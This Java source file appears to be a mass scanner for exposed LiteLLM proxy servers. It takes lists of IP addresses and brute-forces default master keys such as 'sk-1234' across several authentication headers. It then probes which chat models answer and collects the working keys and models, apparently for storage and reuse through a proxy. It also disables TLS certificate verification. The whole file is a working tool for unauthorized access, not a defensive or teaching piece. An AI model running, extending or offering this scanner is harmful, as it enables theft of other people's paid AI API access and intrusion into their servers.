package com.example.aichat.proxy.service;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Component;

import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.security.cert.X509Certificate;
import java.time.Duration;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * LiteLLM 扫描器 V6
 * <p>
 * 流程：
 *   Step-0: GET /openapi.json (best-effort) 提取认证头 (securitySchemes)
 *   Step-1: 用提取到的 header 尝试密码 (GET /v1/models)，失败回退多 header
 *   Step-2: 并行探测模型可用性 (POST /v1/chat/completions)
 *   Step-3: 返回结果供入库
 * <p>
 * 架构：HTTP/2 + 虚拟线程(JDK21) + Semaphore 限流 + CompletableFuture 全异步
 * <p>
 * V6 修复：用虚拟线程替代 ForkJoinPool，彻底消除大批量扫描时的线程池死锁。
 * 虚拟线程阻塞在 Semaphore.acquire() 时不占用平台线程，HTTP 回调不会被饿死。
 */
@Component
public class LitellmScanner {

    private static final Logger log = LoggerFactory.getLogger(LitellmScanner.class);
    private static final ObjectMapper objectMapper = new ObjectMapper();

    private static final int CONNECT_TIMEOUT_MS = 5000;
    private static final int REQUEST_TIMEOUT_MS = 15000;
    private static final int MAX_CONCURRENT_REQUESTS = 200;
    private static final int MAX_PROBE_MODELS = 15;

    private static final String DEFAULT_AUTH_HEADER = "Authorization";
    private static final String DEFAULT_AUTH_PREFIX = "Bearer ";

    /** 多候选认证头：openapi.json 失败时，依次尝试这些 header 组合 */
    private static final List<AuthInfo> FALLBACK_AUTH_HEADERS = List.of(
            new AuthInfo("Authorization", "Bearer "),
            new AuthInfo("x-litellm-api-key", ""),
            new AuthInfo("x-api-key", "")
    );

    public static final List<String> DEFAULT_PASSWORDS = List.of(
            "sk-1234", "sk-12345", "sk-123456", "sk-12345678"
    );

    private final HttpClient httpClient;
    private final Semaphore requestSemaphore;

    /**
     * 虚拟线程池：每个任务一个虚拟线程，阻塞在 Semaphore 时自动让出平台线程，
     * 不会像 ForkJoinPool 那样因线程耗尽导致死锁。
     */
    private final ExecutorService virtualPool;

    // ===================== 数据类 =====================

    public record AuthInfo(String headerName, String headerPrefix) {
        public String buildHeaderValue(String password) {
            return headerPrefix + password;
        }
    }

    public record ScanFullResult(
            String ip, String baseURL, boolean success, long responseTime,
            String bestModel, String bestPassword,
            List<String> availableModels, int totalModels,
            List<PasswordResult> matchedPasswords,
            String error,
            String authHeader
    ) {}

    public record PasswordResult(String password, String message, List<String> models) {}

    /** 单 header 密码扫描结果，附带命中的 authInfo */
    private record PasswordScanResult(List<PasswordResult> matched, AuthInfo authInfo) {}

    // ===================== 构造 =====================

    public LitellmScanner() {
        // 虚拟线程池（JDK 21）
        this.virtualPool = Executors.newVirtualThreadPerTaskExecutor();

        try {
            SSLContext sslContext = SSLContext.getInstance("TLS");
            sslContext.init(null, new TrustManager[]{new X509TrustManager() {
                public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
                public void checkClientTrusted(X509Certificate[] c, String t) {}
                public void checkServerTrusted(X509Certificate[] c, String t) {}
            }}, new java.security.SecureRandom());

            // HttpClient 回调也跑在虚拟线程上
            this.httpClient = HttpClient.newBuilder()
                    .version(HttpClient.Version.HTTP_2)
                    .connectTimeout(Duration.ofMillis(CONNECT_TIMEOUT_MS))
                    .sslContext(sslContext)
                    .executor(virtualPool)
                    .build();

            log.info("[Scanner] HttpClient 初始化: HTTP/2, 虚拟线程, connectTimeout={}ms, semaphore={}",
                    CONNECT_TIMEOUT_MS, MAX_CONCURRENT_REQUESTS);
        } catch (Exception e) {
            throw new RuntimeException("创建 HttpClient 失败", e);
        }
        this.requestSemaphore = new Semaphore(MAX_CONCURRENT_REQUESTS);
    }

    // ===================== Semaphore 限流（虚拟线程安全） =====================

    /**
     * 获取信号量 → 执行异步任务 → 完成后释放信号量。
     * 虚拟线程阻塞在 acquire() 时自动 unmount，不占用平台线程。
     */
    private <T> CompletableFuture<T> acquireAndExecute(java.util.function.Supplier<CompletableFuture<T>> task) {
        CompletableFuture<T> result = new CompletableFuture<>();
        virtualPool.execute(() -> {
            try {
                requestSemaphore.acquire();
                task.get().whenComplete((r, ex) -> {
                    requestSemaphore.release();
                    if (ex != null) result.completeExceptionally(ex);
                    else result.complete(r);
                });
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                requestSemaphore.release();
                result.completeExceptionally(e);
            } catch (Exception e) {
                requestSemaphore.release();
                result.completeExceptionally(e);
            }
        });
        return result;
    }

    // ===================== Step-0: 发现端点 + 提取认证头 =====================

    /**
     * GET /openapi.json（best-effort）：
     *   - 成功 → 解析 securitySchemes 提取认证头
     *   - 失败 → 返回 empty（调用方回退到多 header 尝试，不跳过）
     */
    private CompletableFuture<Optional<AuthInfo>> discoverEndpointAsync(String endpoint) {
        log.debug("[Step-0] 尝试 GET {}/openapi.json (best-effort)", endpoint);
        long start = System.currentTimeMillis();

        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(endpoint + "/openapi.json"))
                .timeout(Duration.ofMillis(REQUEST_TIMEOUT_MS))
                .GET()
                .build();

        return acquireAndExecute(() ->
                httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString())
                        .thenApply(resp -> {
                            long ms = System.currentTimeMillis() - start;
                            if (resp.statusCode() != 200) {
                                log.debug("[Step-0] {} openapi.json 不可用: status={}, {}ms",
                                        endpoint, resp.statusCode(), ms);
                                return Optional.<AuthInfo>empty();
                            }
                            log.info("[Step-0] {} openapi.json 可用, 解析 securitySchemes ({}ms)", endpoint, ms);
                            AuthInfo authInfo = parseSecuritySchemes(resp.body());
                            log.info("[Step-0] {} 认证头: name={}, prefix='{}'",
                                    endpoint, authInfo.headerName(), authInfo.headerPrefix());
                            return Optional.of(authInfo);
                        })
                        .exceptionally(ex -> {
                            long ms = System.currentTimeMillis() - start;
                            log.debug("[Step-0] {} openapi.json 请求失败: {} ({}ms)",
                                    endpoint, ex.getMessage(), ms);
                            return Optional.empty();
                        })
        );
    }

    private AuthInfo parseSecuritySchemes(String body) {
        try {
            JsonNode root = objectMapper.readTree(body);
            JsonNode schemes = null;
            if (root.has("components") && root.get("components").has("securitySchemes")) {
                schemes = root.get("components").get("securitySchemes");
            } else if (root.has("securitySchemes")) {
                schemes = root.get("securitySchemes");
            }

            if (schemes != null && schemes.isObject()) {
                Iterator<Map.Entry<String, JsonNode>> fields = schemes.fields();
                while (fields.hasNext()) {
                    Map.Entry<String, JsonNode> entry = fields.next();
                    JsonNode scheme = entry.getValue();
                    String type = scheme.has("type") ? scheme.get("type").asText() : "";
                    String in = scheme.has("in") ? scheme.get("in").asText() : "";

                    if ("apiKey".equals(type) && "header".equals(in) && scheme.has("name")) {
                        String headerName = scheme.get("name").asText();
                        log.debug("[Step-0] 发现 apiKey 认证: scheme={}, headerName={}",
                                entry.getKey(), headerName);
                        return new AuthInfo(headerName, "");
                    }
                    if ("http".equals(type)) {
                        String schemeValue = scheme.has("scheme") ? scheme.get("scheme").asText() : "";
                        if ("bearer".equalsIgnoreCase(schemeValue)) {
                            log.debug("[Step-0] 发现 Bearer 认证: scheme={}", entry.getKey());
                            return new AuthInfo(DEFAULT_AUTH_HEADER, DEFAULT_AUTH_PREFIX);
                        }
                    }
                }
            }
        } catch (Exception e) {
            log.debug("[Step-0] openapi.json 解析失败: {}", e.getMessage());
        }
        return new AuthInfo(DEFAULT_AUTH_HEADER, DEFAULT_AUTH_PREFIX);
    }

    // ===================== Step-1: 密码扫描 =====================

    private CompletableFuture<List<PasswordResult>> scanPasswordsAsync(
            String endpoint, List<String> passwords, AuthInfo authInfo) {
        log.info("[Step-1] 密码扫描: endpoint={}, header={}, 密码数={}",
                endpoint, authInfo.headerName(), passwords.size());
        long start = System.currentTimeMillis();

        List<CompletableFuture<Optional<PasswordResult>>> futures = new ArrayList<>();
        for (String password : passwords) {
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(endpoint + "/v1/models"))
                    .timeout(Duration.ofMillis(REQUEST_TIMEOUT_MS))
                    .header(authInfo.headerName(), authInfo.buildHeaderValue(password))
                    .GET()
                    .build();

            futures.add(acquireAndExecute(() ->
                    httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString())
                            .thenApply(resp -> {
                                if (resp.statusCode() == 200) {
                                    List<String> models = parseModelIds(resp.body());
                                    log.info("[Step-1] 密码命中: header={}, pwd={}, models={}",
                                            authInfo.headerName(), maskKey(password), models.size());
                                    return Optional.of(new PasswordResult(
                                            password, models.size() + " models", models));
                                }
                                log.debug("[Step-1] 密码未命中: header={}, pwd={}, status={}",
                                        authInfo.headerName(), maskKey(password), resp.statusCode());
                                return Optional.<PasswordResult>empty();
                            })
                            .exceptionally(ex -> {
                                log.debug("[Step-1] 密码请求异常: header={}, pwd={}, err={}",
                                        authInfo.headerName(), maskKey(password), ex.getMessage());
                                return Optional.empty();
                            })
            ));
        }

        return CompletableFuture.allOf(futures.toArray(new CompletableFuture[0]))
                .thenApply(v -> {
                    List<PasswordResult> matched = futures.stream()
                            .map(CompletableFuture::join)
                            .filter(Optional::isPresent)
                            .map(Optional::get)
                            .toList();
                    long ms = System.currentTimeMillis() - start;
                    log.info("[Step-1] 密码扫描完成: header={}, 命中={}, 耗时={}ms",
                            authInfo.headerName(), matched.size(), ms);
                    return matched;
                });
    }

    /**
     * 多 header 回退：依次尝试 FALLBACK_AUTH_HEADERS，命中即短路返回。
     */
    private CompletableFuture<PasswordScanResult> scanPasswordsWithFallbackAsync(
            String endpoint, List<String> passwords) {
        log.info("[Step-1-Fallback] 多 header 回退: endpoint={}, headers={}",
                endpoint, FALLBACK_AUTH_HEADERS.size());

        CompletableFuture<PasswordScanResult> chain =
                CompletableFuture.completedFuture(new PasswordScanResult(List.of(), null));

        for (AuthInfo authInfo : FALLBACK_AUTH_HEADERS) {
            chain = chain.thenCompose(prev -> {
                if (!prev.matched().isEmpty()) {
                    return CompletableFuture.completedFuture(prev);
                }
                return scanPasswordsAsync(endpoint, passwords, authInfo)
                        .thenApply(matched -> {
                            if (!matched.isEmpty()) {
                                log.info("[Step-1-Fallback] 命中: header={}", authInfo.headerName());
                                return new PasswordScanResult(matched, authInfo);
                            }
                            return new PasswordScanResult(List.of(), null);
                        });
            });
        }
        return chain;
    }

    // ===================== Step-2: 并行探测模型可用性 =====================

    private CompletableFuture<List<String>> probeModelsAsync(
            String endpoint, String password, AuthInfo authInfo, List<String> models) {
        List<String> toProbe = models.size() > MAX_PROBE_MODELS
                ? models.subList(0, MAX_PROBE_MODELS) : models;

        log.info("[Step-2] 并行探测模型: {}个(总{}个), endpoint={}",
                toProbe.size(), models.size(), endpoint);
        long start = System.currentTimeMillis();
        AtomicInteger done = new AtomicInteger(0);
        AtomicInteger avail = new AtomicInteger(0);
        int total = toProbe.size();

        List<CompletableFuture<Optional<String>>> futures = toProbe.stream()
                .map(model -> {
                    String payload = String.format(
                            "{\"model\":\"%s\",\"messages\":[{\"role\":\"user\",\"content\":\"Hello!\"}]}",
                            model);

                    HttpRequest request = HttpRequest.newBuilder()
                            .uri(URI.create(endpoint + "/v1/chat/completions"))
                            .timeout(Duration.ofMillis(REQUEST_TIMEOUT_MS))
                            .header("Content-Type", "application/json")
                            .header(authInfo.headerName(), authInfo.buildHeaderValue(password))
                            .POST(HttpRequest.BodyPublishers.ofString(payload))
                            .build();

                    return acquireAndExecute(() ->
                            httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString())
                                    .thenApply(resp -> {
                                        int d = done.incrementAndGet();
                                        boolean ok = resp.statusCode() == 200;
                                        if (ok) avail.incrementAndGet();
                                        log.debug("[Step-2] [{}/{}] {} -> {} (HTTP {})",
                                                d, total, model, ok ? "OK" : "FAIL", resp.statusCode());
                                        return ok ? Optional.of(model) : Optional.<String>empty();
                                    })
                                    .exceptionally(ex -> {
                                        done.incrementAndGet();
                                        log.debug("[Step-2] {} -> 异常: {}", model, ex.getMessage());
                                        return Optional.empty();
                                    })
                    );
                })
                .toList();

        return CompletableFuture.allOf(futures.toArray(new CompletableFuture[0]))
                .thenApply(v -> {
                    List<String> available = futures.stream()
                            .map(CompletableFuture::join)
                            .filter(Optional::isPresent)
                            .map(Optional::get)
                            .toList();
                    long ms = System.currentTimeMillis() - start;
                    log.info("[Step-2] 模型探测完成: 探测={}, 可用={}, 不可用={}, 耗时={}ms",
                            total, avail.get(), total - avail.get(), ms);
                    return available;
                });
    }

    // ===================== 单 IP 全流程 =====================

    public CompletableFuture<ScanFullResult> scanIPAsync(String ip, List<String> passwords) {
        String cleanIP = ip.contains(",") ? ip.split(",")[0].trim() : ip.trim();
        String baseURL = normalizeEndpoint(cleanIP);
        long startTime = System.currentTimeMillis();

        log.info("[scanIP] 开始: ip={}, baseURL={}", cleanIP, baseURL);

        // Step-0: 尝试 /openapi.json (best-effort，失败不跳过)
        return discoverEndpointAsync(baseURL)
                .thenCompose(authOpt -> {
                    if (authOpt.isPresent()) {
                        AuthInfo authInfo = authOpt.get();
                        log.info("[scanIP] {} -> openapi.json 成功, header={}", cleanIP, authInfo.headerName());
                        return scanPasswordsAsync(baseURL, passwords, authInfo)
                                .thenApply(matched -> new PasswordScanResult(matched, authInfo));
                    } else {
                        log.info("[scanIP] {} -> openapi.json 失败, 回退多 header 扫描", cleanIP);
                        return scanPasswordsWithFallbackAsync(baseURL, passwords);
                    }
                })
                .thenCompose(scanResult -> {
                    List<PasswordResult> matched = scanResult.matched();
                    AuthInfo usedAuth = scanResult.authInfo();

                    if (matched.isEmpty()) {
                        log.info("[scanIP] {} -> 所有 header+密码组合均失败", cleanIP);
                        return CompletableFuture.completedFuture(
                                fail(cleanIP, baseURL, startTime, "no valid password"));
                    }

                    PasswordResult best = matched.stream()
                            .max(Comparator.comparingInt(p -> p.models().size()))
                            .orElse(matched.getFirst());

                    log.info("[scanIP] {} -> 最佳密码: header={}, pwd={}, models={}",
                            cleanIP, usedAuth.headerName(), maskKey(best.password()), best.models().size());

                    if (best.models().isEmpty()) {
                        long ms = System.currentTimeMillis() - startTime;
                        return CompletableFuture.completedFuture(new ScanFullResult(
                                cleanIP, baseURL, true, ms,
                                null, best.password(),
                                List.of(), 0, matched, "no models found",
                                usedAuth.headerName()));
                    }

                    return probeModelsAsync(baseURL, best.password(), usedAuth, best.models())
                            .thenApply(available -> {
                                long ms = System.currentTimeMillis() - startTime;
                                String bestModel = available.isEmpty() ? null : available.getFirst();
                                log.info("[scanIP] {} -> 完成: header={}, 可用={}, bestModel={}, 总耗时={}ms",
                                        cleanIP, usedAuth.headerName(), available.size(), bestModel, ms);
                                return new ScanFullResult(
                                        cleanIP, baseURL, true, ms,
                                        bestModel, best.password(),
                                        available, best.models().size(),
                                        matched, null,
                                        usedAuth.headerName());
                            });
                })
                .exceptionally(ex -> {
                    long ms = System.currentTimeMillis() - startTime;
                    log.error("[scanIP] {} -> 异常: {}, 耗时={}ms", cleanIP, ex.getMessage(), ms);
                    return fail(cleanIP, baseURL, startTime, ex.getMessage());
                });
    }

    // ===================== 批量全量扫描（公开接口） =====================

    public List<ScanFullResult> fullScan(List<String> ips, List<String> passwords,
                                          int timeoutSeconds, int maxWorkers, int batchConcurrency) {
        if (passwords == null || passwords.isEmpty()) passwords = DEFAULT_PASSWORDS;

        log.info("[fullScan] ========== 启动批量扫描 ==========");
        log.info("[fullScan] IP数={}, 密码数={}, semaphore={}, 虚拟线程=ON",
                ips.size(), passwords.size(), MAX_CONCURRENT_REQUESTS);
        long startTime = System.currentTimeMillis();

        AtomicInteger completed = new AtomicInteger(0);
        AtomicInteger successCount = new AtomicInteger(0);
        int total = ips.size();

        List<String> finalPasswords = passwords;
        List<CompletableFuture<ScanFullResult>> futures = ips.stream()
                .map(ip -> scanIPAsync(ip, finalPasswords)
                        .whenComplete((r, ex) -> {
                            int done = completed.incrementAndGet();
                            if (r != null && r.success()) successCount.incrementAndGet();
                            if (done % 100 == 0 || done == total) {
                                long elapsed = (System.currentTimeMillis() - startTime) / 1000;
                                double rate = elapsed > 0 ? done / (double) elapsed : done;
                                log.info("[fullScan] 进度: {}/{}, 成功={}, 速率={} 个/秒",
                                        done, total, successCount.get(), String.format("%.1f", rate));
                            }
                        }))
                .toList();

        int globalTimeoutSec = Math.max(120, total * Math.max(timeoutSeconds, 3) / MAX_CONCURRENT_REQUESTS + 60);
        log.info("[fullScan] 全局超时={}s", globalTimeoutSec);
        try {
            CompletableFuture.allOf(futures.toArray(new CompletableFuture[0]))
                    .get(globalTimeoutSec, TimeUnit.SECONDS);
        } catch (Exception e) {
            log.warn("[fullScan] 全局超时 ({}s): {}", globalTimeoutSec, e.getMessage());
        }

        List<ScanFullResult> results = new ArrayList<>();
        for (CompletableFuture<ScanFullResult> f : futures) {
            if (f.isDone() && !f.isCompletedExceptionally()) {
                results.add(f.join());
            } else {
                results.add(new ScanFullResult("?", "?", false, 0,
                        null, null, List.of(), 0, List.of(), "timeout", null));
            }
        }

        long totalSec = (System.currentTimeMillis() - startTime) / 1000;
        log.info("[fullScan] ========== 批量扫描完成 ==========");
        log.info("[fullScan] 总耗时={}s, 总IP={}, 成功={}, 失败={}",
                totalSec, total, successCount.get(), total - successCount.get());
        return results;
    }

    // ===================== 工具方法 =====================

    private List<String> parseModelIds(String body) {
        try {
            JsonNode root = objectMapper.readTree(body);
            JsonNode data = root.get("data");
            if (data != null && data.isArray()) {
                List<String> ids = new ArrayList<>();
                for (JsonNode m : data) {
                    if (m.has("id")) {
                        String id = m.get("id").asText();
                        if (!id.isBlank()) ids.add(id);
                    }
                }
                return ids;
            }
        } catch (Exception e) {
            log.debug("[Scanner] JSON 解析失败: {}", e.getMessage());
        }
        return List.of();
    }

    private static String maskKey(String key) {
        if (key == null || key.length() <= 4) return "****";
        return key.substring(0, 4) + "****";
    }

    private ScanFullResult fail(String ip, String baseURL, long startTime, String error) {
        return new ScanFullResult(ip, baseURL, false, System.currentTimeMillis() - startTime,
                null, null, List.of(), 0, List.of(), error, null);
    }

    public static String normalizeEndpoint(String endpoint) {
        endpoint = endpoint.strip();
        if (endpoint.startsWith("http://") || endpoint.startsWith("https://")) {
            return endpoint;
        }
        String hostPart, pathPart;
        int slashIdx = endpoint.indexOf('/');
        if (slashIdx >= 0) {
            hostPart = endpoint.substring(0, slashIdx);
            pathPart = endpoint.substring(slashIdx);
        } else {
            hostPart = endpoint;
            pathPart = "";
        }
        String protocol;
        int colonIdx = hostPart.lastIndexOf(':');
        if (colonIdx > 0) {
            String port = hostPart.substring(colonIdx + 1);
            protocol = switch (port) {
                case "443", "8443" -> "https";
                case "80", "8000", "8080", "3000", "4000" -> "http";
                default -> isDomainName(hostPart.substring(0, colonIdx)) ? "https" : "http";
            };
        } else {
            protocol = isDomainName(hostPart) ? "https" : "http";
        }
        return protocol + "://" + hostPart + pathPart;
    }

    private static boolean isDomainName(String host) {
        return host.contains(".") && !host.replace(".", "").chars().allMatch(Character::isDigit);
    }
}
